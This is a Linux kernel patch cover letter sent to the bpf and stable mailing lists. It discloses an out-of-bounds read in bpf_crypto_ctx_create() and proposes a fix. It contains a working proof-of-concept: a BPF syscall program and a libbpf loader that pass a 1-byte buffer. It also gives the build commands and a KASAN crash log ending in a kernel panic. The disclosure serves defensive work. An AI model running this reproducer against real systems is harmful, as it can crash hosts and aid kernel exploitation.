Received: from mail-pj2-f43.google.com (mail-pj2-f43.google.com [74.125.227.171])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E885A3B1EE7
	for <stable@vger.kernel.org>; Sat, 19 Sep 2026 08:45:19 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.171
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789807522; cv=none; b=g2qKQarSDrnCHkJSEcLirKeLWhivHWKQbMKeT+2JRN9F+ZxHo6iUYF+XSFOfR86XU6kPKOJ92z6QSw4JE2BOb2kvBQMVI7yFfjCnkKCUXHEPftgTnecbXFFutAjM5VkTWZUrdTRj85Wd9a1jHyhm4G5rFIUIENVOOxnSPFqDmnk=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789807522; c=relaxed/simple;
	bh=4I980kICvyABLqVpqDqSgEeu/U+q8Dzz8HYc8L10P5w=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=AS9e1dnuCsxHLr1Gso4ovejguvw4PRxncMChmQtC3MSduSiwDm1AZEPV+Nt+0hf8jPDcrD3GgIH1ItlHff9YBXmxmu0bBXQkt1R98yfgkC2V2Lvh7T/Xe2wDgaTIJaWX4J9xvSM7NOVyrOtSCEwbivNtTlZQkyt1acODuAcNB0k=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=VIrROkW4; arc=none smtp.client-ip=74.125.227.171
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="VIrROkW4"
Received: by mail-pj2-f43.google.com with SMTP id 98e67ed59e1d1-396ccdaea75so496296a91.1
        for <stable@vger.kernel.org>; Sat, 19 Sep 2026 01:45:19 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1789807519; x=1790412319; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=1l8TrkXbGJ71DiS4SFI2tBmgmGTmPnfE0B+GQalRacA=;
        b=VIrROkW4YAsVvZjNoZFALa79NZM5RRdKR6C6jRVu+Ic0VOEDAO8QBIGgM/6EqlJ8Qt
         D8TRpZKb9F6r1a9FhSFp7C7IZsY/eOIXMjAOLNGnZR8Ut+rSddj/n5Qpoj3MB2kie6e9
         7zul4gyodlad4sMecOtNht2Hthz6ZsP7bk1EUKnPtlUgE+LgoEAauxw3cKaAOnWpkPP8
         WXDV8w2FLaIicKKtsW+rAgB7LoYNbcdP3fFIe9IHYrtdW1siShMWJEW3hDWYM2HPDP6q
         TUtZvazaJs7aKzyVZc5o81WNKb7yHjFhnCtKDCFU+SPgN0a+yur8O1K3/JKdw1raBAM5
         WE9A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789807519; x=1790412319;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=1l8TrkXbGJ71DiS4SFI2tBmgmGTmPnfE0B+GQalRacA=;
        b=wkfNmdqJjKsoHD6kkQhASWO12GEQuIRLp4JOn/A5UhKC2dlNdJPGaZdK5Ywtr3VUJD
         yvVZkrd3OOlAkKrehCts52mpB8K4X0fniXejro1n+T1jxjhZ0OsgQ+DpkXgfn5Jwd0mT
         OqN3Ndfl+dDkM8gjq5Nlojw+RKhEOzDmlOHci41zO2PmS93sRVvHNwiDOKpYJMDip6ZK
         6j3UmiEnKspfNw8Y/0Dft1sPt7qoAEuBexIcBtycqoFbvqzDC8KpFgZmBPgOhIuY2FXY
         HvJ2vZE/as7q0YN9JEYiUVdnES0Ul/QLDxrcfvao9WMvHeMFrMh1bL1PZv1iZ1h2aYFb
         mTdw==
X-Forwarded-Encrypted: i=1; AKwUvBxFkuw32vIdrqZq6mYYd/ItLdg41w6ATD8lTjFQyYEAjrlZ3dJlUqaQdq4ICiC6kt53QaV6ZTo=@vger.kernel.org
X-Gm-Message-State: AFuF++mNqgLKD9DxxXX0FEOoZuhyTzLOdcOLl75JL4895VnHzN5O9zLh
	b2Otdv9fZLRVlpIgUaeBfR2CDm8/1oyfcbDpncmBxPJczB3foDDDpe9p
X-Gm-Gg: AYBFou1LOVMpIhsEwY5n/HoTbESvKLLmgVnf2fX3+/oXFJNIY/B36sQK+V1tuN4dAP1
	j6DmuVbrFOju3XdV01+mcYBbuXgFK7ORTXNZeh7eTonamwQm9Cq7qFA6ux3W2sT+dleSJ8HaJT6
	t9/0tXhOYtOXJuu50gNQkVzHZfh7glcf67rm76qUgCaB92gNvwSp52nsnYnLQocHsNgaiV4v3lv
	QMj5yEX7DbUZajGFAdQ6dVUHSGNAb8jiN5cQ9sxjpslMrvRvJ+AoaemCGHsjzCcFbDr5wxpGynx
	zv+VL84x/WiA/cZCFTaBRSnenleC04bBVA/0Kvbf8DBR8Xu9gb5R50Ze0DCltNm/kg4XzOIeQpU
	9pfto7fZCPuFzmXa3mO6LG0WLPeuQCJekxvZEHrmHnRv96PVUXWSmp4Z47d24wpBuLV9cgqUTtV
	1bC5dc8Udm+rElURSiw3mZzH1SNmcp3gKzhsUmuhu+13uYrm7DGQpynrxvFDa/FLfXQo3w2amDe
	qhb+Z8TzagIiZXdkW0UN5uQa+mCIKT6MZbKjtff4nhVlqkBECRn2TY8TSMCzB/BBTC6jQ==
X-Received: by 2002:a17:90b:2249:b0:398:9bd3:d6d4 with SMTP id 98e67ed59e1d1-39e556ad1f9mr5359135a91.14.1789807519032;
        Sat, 19 Sep 2026 01:45:19 -0700 (PDT)
Received: from lenovo-thinkbook (42-2-127-248.static.netvigator.com. [42.2.127.248])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e6ca4ef3esm3556837a91.1.2026.09.19.01.45.13
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 19 Sep 2026 01:45:18 -0700 (PDT)
From: Yuqi Xu <xuyuqiabc@gmail.com>
To: bpf@vger.kernel.org
Cc: Vadim Fedorenko <vadim.fedorenko@linux.dev>,
	Alexei Starovoitov <ast@kernel.org>,
	Daniel Borkmann <daniel@iogearbox.net>,
	Andrii Nakryiko <andrii@kernel.org>,
	Eduard Zingerman <eddyz87@gmail.com>,
	Kumar Kartikeya Dwivedi <memxor@gmail.com>,
	Martin KaFai Lau <martin.lau@linux.dev>,
	Song Liu <song@kernel.org>,
	Yonghong Song <yonghong.song@linux.dev>,
	Jiri Olsa <jolsa@kernel.org>,
	Emil Tsalapatis <emil@etsalapatis.com>,
	Ihor Solodrai <ihor.solodrai@linux.dev>,
	stable@vger.kernel.org,
	Vega <vega@nebusec.ai>,
	Ren Wei <weir@nebusec.ai>,
	xuyq21@lenovo.com
Subject: [PATCH bpf 0/1] bpf: crypto: check params size before reading reserved fields
Date: Sat, 19 Sep 2026 16:45:01 +0800
Message-ID: <cover.1789802413.git.xuyuqiabc@gmail.com>
X-Mailer: git-send-email 2.55.0
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in kernel/bpf/crypto.c.  The reproducer
below runs as root because loading a BPF_PROG_TYPE_SYSCALL program is
gated by bpf_capable(), so a user namespace is not sufficient.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

bpf_crypto_ctx_create() takes params with the kfunc __sz annotation, so
the verifier only guarantees that params__sz bytes of the buffer are
valid.  The function first reads params->reserved[0] and
params->reserved[1] (offsets 14 and 15) and only then compares
params__sz with sizeof(struct bpf_crypto_params).  A BPF program can
therefore pass a shorter buffer and make the kernel read past the
validated region.

The PoC uses a BPF_PROG_TYPE_SYSCALL program with a 1-byte hash map
value and passes params__sz = 1.  The map is created with
BPF_F_NO_PREALLOC so that each element is a separate kmalloc object and
KASAN can see the overrun; with the default preallocated hash map the
elements share one large allocation and the same read lands in adjacent
memory without a report.

The patch moves the size comparison in front of the reserved field
reads, so the out-of-bounds read cannot happen anymore.  Valid
parameters behave exactly as before: with the patch applied, a program
that passes a full-size valid struct still creates a crypto context.

Reproducer:

The kernel must be built with CONFIG_BPF_SYSCALL, CONFIG_BPF_JIT,
CONFIG_DEBUG_INFO_BTF, CONFIG_CRYPTO_SKCIPHER2 and CONFIG_KASAN, and
booted with panic_on_warn=1.

  clang -target bpf -O2 -g -D__TARGET_ARCH_x86 -c poc.bpf.c -o poc.bpf.o
  # build libbpf from tools/lib/bpf, then link the userspace part:
  gcc -O2 -o poc poc.c -lbpf -lelf -lz -lzstd
  ./poc

We run the PoC in a 4 vCPU, 6 GB RAM x86 QEMU/KVM environment as root
(CAP_BPF in the initial user namespace).

------BEGIN poc.bpf.c------

#include <linux/types.h>
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

struct bpf_crypto_ctx {};

struct bpf_crypto_params {
	char type[14];
	__u8 reserved[2];
	char algo[128];
	__u8 key[256];
	__u32 key_len;
	__u32 authsize;
};

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1);
	__uint(map_flags, BPF_F_NO_PREALLOC);
	__type(key, __u32);
	__type(value, __u8);
} tiny_map SEC(".maps");

struct bpf_crypto_ctx *bpf_crypto_ctx_create(const struct bpf_crypto_params *params,
					     __u32 params__sz, int *err) __ksym;
void bpf_crypto_ctx_release(struct bpf_crypto_ctx *ctx) __ksym;

SEC("syscall")
int trigger(void *ctx)
{
	__u32 key = 0;
	__u8 *params;
	int err = 0;
	struct bpf_crypto_ctx *cctx;

	params = bpf_map_lookup_elem(&tiny_map, &key);
	if (!params)
		return 1;

	cctx = bpf_crypto_ctx_create((const struct bpf_crypto_params *)params, 1, &err);
	if (cctx)
		bpf_crypto_ctx_release(cctx);
	return err;
}

char _license[] SEC("license") = "GPL";

------END poc.bpf.c--------

------BEGIN poc.c------

#include <errno.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>

static int libbpf_print_fn(enum libbpf_print_level level, const char *fmt, va_list args)
{
	if (level == LIBBPF_DEBUG)
		return 0;
	return vfprintf(stderr, fmt, args);
}

int main(void)
{
	char log_buf[1 << 20] = {};
	struct bpf_object_open_opts open_opts = {
		.sz = sizeof(open_opts),
		.kernel_log_buf = log_buf,
		.kernel_log_size = sizeof(log_buf),
		.kernel_log_level = 1,
	};
	struct rlimit rlim = {
		.rlim_cur = RLIM_INFINITY,
		.rlim_max = RLIM_INFINITY,
	};
	struct bpf_object *obj = NULL;
	struct bpf_map *map;
	struct bpf_program *prog;
	struct bpf_test_run_opts opts;
	__u32 key = 0;
	__u8 value = 0;
	int prog_fd;
	int map_fd;
	int err;

	libbpf_set_print(libbpf_print_fn);
	setrlimit(RLIMIT_MEMLOCK, &rlim);

	obj = bpf_object__open_file("./poc.bpf.o", &open_opts);
	if (!obj) {
		fprintf(stderr, "open failed\n");
		return 1;
	}

	bpf_object__for_each_program(prog, obj)
		bpf_program__set_log_level(prog, 2);

	err = bpf_object__load(obj);
	if (err) {
		fprintf(stderr, "load failed: %d (%s)\n", err, strerror(-err));
		if (log_buf[0])
			fprintf(stderr, "%s\n", log_buf);
		goto out;
	}

	map = bpf_object__find_map_by_name(obj, "tiny_map");
	if (!map) {
		err = -ENOENT;
		fprintf(stderr, "map not found\n");
		goto out;
	}

	map_fd = bpf_map__fd(map);
	err = bpf_map_update_elem(map_fd, &key, &value, BPF_ANY);
	if (err) {
		err = -errno;
		fprintf(stderr, "map update failed: %d (%s)\n", err, strerror(errno));
		goto out;
	}

	prog = bpf_object__find_program_by_name(obj, "trigger");
	if (!prog) {
		err = -ENOENT;
		fprintf(stderr, "program not found\n");
		goto out;
	}

	prog_fd = bpf_program__fd(prog);
	memset(&opts, 0, sizeof(opts));
	opts.sz = sizeof(opts);
	err = bpf_prog_test_run_opts(prog_fd, &opts);
	if (err) {
		err = -errno;
		fprintf(stderr, "test run failed: %d (%s)\n", err, strerror(errno));
		goto out;
	}

	fprintf(stderr, "test run ok, retval=%u\n", opts.retval);
	err = 0;
out:
	bpf_object__close(obj);
	return err ? 1 : 0;
}

------END poc.c--------

-----BEGIN crash log----

[    1.544932] ==================================================================
[    1.544942] BUG: KASAN: slab-out-of-bounds in bpf_crypto_ctx_create+0x811/0xaf0
[    1.544950] Read of size 1 at addr ffff888102fbee4e by task poc.static/92
[    1.544954] 
[    1.544958] CPU: 1 UID: 0 PID: 92 Comm: poc.static Not tainted 7.3.0-rc2-00040-gb4e875d397da #1 PREEMPT(lazy) 
[    1.544962] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
[    1.544965] Call Trace:
[    1.544968]  <TASK>
[    1.544970]  dump_stack_lvl+0x4d/0x70
[    1.544977]  print_report+0x14b/0x4b0
[    1.544983]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
[    1.544990]  kasan_report+0xfa/0x120
[    1.544995]  ? bpf_crypto_ctx_create+0x811/0xaf0
[    1.544999]  ? bpf_crypto_ctx_create+0x811/0xaf0
[    1.545003]  bpf_crypto_ctx_create+0x811/0xaf0
[    1.545007]  ? srso_alias_return_thunk+0x5/0xfbef5
[    1.545011]  bpf_prog_1a0a06253873ed44_trigger+0x60/0x78
[    1.545015]  bpf_prog_test_run_syscall+0x42e/0x9f0
[    1.545023]  ? srso_alias_return_thunk+0x5/0xfbef5
[    1.545026]  ? __pfx_bpf_prog_test_run_syscall+0x10/0x10
[    1.545028]  ? srso_alias_return_thunk+0x5/0xfbef5
[    1.545031]  ? __pfx_bpf_check_uarg_tail_zero+0x10/0x10
[    1.545036]  ? srso_alias_return_thunk+0x5/0xfbef5
[    1.545040]  __sys_bpf+0x12c3/0x5280
[    1.545044]  ? __pfx___sys_bpf+0x10/0x10
[    1.545047]  ? stack_depot_save_flags+0x2d/0x970
[    1.545054]  ? stack_depot_save_flags+0x2d/0x970
[    1.545057]  ? task_work_run+0x12c/0x230
[    1.545062]  ? exit_to_user_mode_loop+0x135/0x520
[    1.545067]  ? do_syscall_64+0x34e/0x4b0
[    1.545073]  ? srso_alias_return_thunk+0x5/0xfbef5
[    1.545076]  ? do_syscall_64+0x34e/0x4b0
[    1.545079]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.545082]  ? __pfx_do_vmi_align_munmap+0x10/0x10
[    1.545097]  __x64_sys_bpf+0xc4/0x180
[    1.545101]  ? srso_alias_return_thunk+0x5/0xfbef5
[    1.545103]  ? fpregs_assert_state_consistent+0x56/0xe0
[    1.545108]  do_syscall_64+0xde/0x4b0
[    1.545111]  ? srso_alias_return_thunk+0x5/0xfbef5
[    1.545115]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.545118] RIP: 0033:0x53ff3d
[    1.545121] Code: b3 66 2e 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
[    1.545124] RSP: 002b:00007ffd3b599d38 EFLAGS: 00000246 ORIG_RAX: 0000000000000141
[    1.545129] RAX: ffffffffffffffda RBX: 00007ffd3b599e20 RCX: 000000000053ff3d
[    1.545131] RDX: 0000000000000050 RSI: 00007ffd3b599d40 RDI: 000000000000000a
[    1.545133] RBP: 000000003a91e940 R08: 0000000000000004 R09: 0000000000000005
[    1.545135] R10: 00007ffd3b599e20 R11: 0000000000000246 R12: 00007ffd3b599ed0
[    1.545137] R13: 00007ffd3b69a018 R14: 00000000005f6068 R15: 0000000000000001
[    1.545141]  </TASK>
[    1.545143] 
[    1.545144] Allocated by task 92:
[    1.545146]  kasan_save_stack+0x2f/0x50
[    1.545150]  kasan_save_track+0x14/0x30
[    1.545152]  __kasan_kmalloc+0x7f/0x90
[    1.545155]  __kmalloc_node_noprof+0x1de/0x4b0
[    1.545159]  alloc_bulk+0x242/0x3b0
[    1.545163]  bpf_mem_alloc_init+0x2a9/0x7e0
[    1.545165]  htab_map_alloc+0xcb8/0x1290
[    1.545169]  map_create+0x50d/0x1b30
[    1.545172]  __sys_bpf+0x1e3f/0x5280
[    1.545174]  __x64_sys_bpf+0xc4/0x180
[    1.545177]  do_syscall_64+0xde/0x4b0
[    1.545179]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.545182] 
[    1.545183] The buggy address belongs to the object at ffff888102fbee00
[    1.545183]  which belongs to the cache kmalloc-96 of size 96
[    1.545185] The buggy address is located 6 bytes to the right of
[    1.545185]  allocated 72-byte region [ffff888102fbee00, ffff888102fbee48)
[    1.545188] 
[    1.545189] The buggy address belongs to the physical page:
[    1.545191] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x102fbe
[    1.545194] flags: 0x200000000000000(node=0|zone=2)
[    1.545198] page_type: f5(slab)
[    1.545202] raw: 0200000000000000 ffff888100042280 dead000000000100 dead000000000122
[    1.545205] raw: 0000000000000000 0000000000200020 00000000f5000000 0000000000000000
[    1.545206] page dumped because: kasan: bad access detected
[    1.545209] 
[    1.545210] Memory state around the buggy address:
[    1.545212]  ffff888102fbed00: 00 00 00 00 00 00 00 00 00 fc fc fc fc fc fc fc
[    1.545214]  ffff888102fbed80: 00 00 00 00 00 00 00 00 00 fc fc fc fc fc fc fc
[    1.545215] >ffff888102fbee00: 00 00 00 00 00 00 00 00 00 fc fc fc fc fc fc fc
[    1.545217]                                               ^
[    1.545218]  ffff888102fbee80: 00 00 00 00 00 00 00 00 00 fc fc fc fc fc fc fc
[    1.545220]  ffff888102fbef00: 00 00 00 00 00 00 00 00 00 fc fc fc fc fc fc fc
[    1.545222] ==================================================================
[    1.545240] Kernel panic - not syncing: KASAN: panic_on_warn set ...

-----END crash log-----

Best regards,
Yuqi Xu

Yuqi Xu (1):
  bpf: crypto: check params size before reading reserved fields

 kernel/bpf/crypto.c | 5 +++--
 1 file changed, 3 insertions(+), 2 deletions(-)


base-commit: e3b6cb020e2f034a98068b2d11bcb3db9fff7e42
-- 
2.55.0

